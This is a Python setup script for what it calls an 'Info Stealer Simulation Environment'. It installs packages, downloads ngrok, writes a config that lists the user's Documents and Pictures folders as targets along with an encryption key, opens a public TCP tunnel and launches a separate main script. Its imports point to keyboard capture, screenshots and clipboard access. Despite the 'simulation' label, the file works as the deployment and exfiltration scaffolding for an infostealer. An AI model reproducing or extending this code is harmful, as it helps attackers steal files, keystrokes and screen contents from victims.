import subprocess
import os
import json
import requests
import zipfile
import io
import platform
import sys
import shutil
import time
import win32console
import win32gui
import win32process
import win32event
import win32api
import win32security
import ctypes
import keyboard
import psutil
from PIL import ImageGrab
import base64
from cryptography.fernet import Fernet
import win32clipboard

def install_python_packages(packages):
    for package in packages:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def download_ngrok():
    if platform.system() == "Windows":
        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip"
    elif platform.system() == "Linux":
        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
    elif platform.system() == "Darwin":
        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-darwin-amd64.zip"
    else:
        raise Exception("Unsupported OS")
    
    response = requests.get(url)
    zip_file = zipfile.ZipFile(io.BytesIO(response.content))
    zip_file.extractall()
    zip_file.close()
    
    if platform.system() == "Windows":
        os.chmod("ngrok.exe", 0o755)
    else:
        os.chmod("ngrok", 0o755)

def create_config_file():
    config = {
        "ngrok_token": "YOUR_NGROK_AUTH_TOKEN",
        "local_port": 65432,
        "interval": 10,
        "target_directories": ["C:\\Users\\%USERNAME%\\Documents", "C:\\Users\\%USERNAME%\\Pictures"],
        "encryption_key": "your_encryption_key_here"
    }
    
    with open('config.json', 'w') as config_file:
        json.dump(config, config_file, indent=4)
    
    print("Config file created. Please update it with your Ngrok token and encryption key.")

def generate_encryption_key():
    from cryptography.fernet import Fernet
    key = Fernet.generate_key()
    return key.decode()

def start_ngrok(config):
    ngrok_token = config['ngrok_token']
    local_port = config['local_port']
    
    # Authenticate Ngrok
    subprocess.run(['./ngrok', 'config', 'add-authtoken', ngrok_token])
    
    # Start Ngrok tunnel
    ngrok_process = subprocess.Popen(['./ngrok', 'tcp', str(local_port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    # Wait for Ngrok to start and get the public URL
    time.sleep(5)
    ngrok_output = ngrok_process.stdout.read().decode()
    public_url = None
    
    for line in ngrok_output.split('\n'):
        if 'tcp://' in line:
            public_url = line.strip().split(' ')[-1]
            break
    
    if not public_url:
        raise Exception("Failed to get public URL from Ngrok")
    
    public_ip, public_port = public_url.replace('tcp://', '').split(':')
    public_port = int(public_port)
    
    return public_ip, public_port

def run_main_script(public_ip, public_port):
    config = load_config()
    config['public_ip'] = public_ip
    config['public_port'] = public_port
    
    with open('config.json', 'w') as config_file:
        json.dump(config, config_file, indent=4)
    
    # Run the main script
    subprocess.run(['python', 'main.py'])

def load_config():
    with open('config.json', 'r') as config_file:
        config = json.load(config_file)
    return config

def main():
    print("Setting up the Info Stealer Simulation Environment...")
    
    # Install required Python packages
    print("Installing required Python packages...")
    packages = ["pywin32", "keyboard", "platform", "psutil", "Pillow", "cryptography"]
    install_python_packages(packages)
    
    # Download Ngrok
    print("Downloading Ngrok...")
    download_ngrok()
    
    # Create configuration file
    print("Creating configuration file...")
    create_config_file()
    
    # Generate encryption key
    encryption_key = generate_encryption_key()
    print(f"Generated encryption key: {encryption_key}")
    print("Please update the 'encryption_key' field in config.json with this key.")
    
    # Load configuration
    config = load_config()
    
    # Prompt user for Ngrok token
    ngrok_token = input("Enter your Ngrok authentication token: ")
    config['ngrok_token'] = ngrok_token
    config['encryption_key'] = encryption_key
    
    with open('config.json', 'w') as config_file:
        json.dump(config, config_file, indent=4)
    
    # Start Ngrok
    print("Starting Ngrok...")
    public_ip, public_port = start_ngrok(config)
    
    # Run the main script
    print("Running the main script...")
    run_main_script(public_ip, public_port)

if __name__ == "__main__":
    main()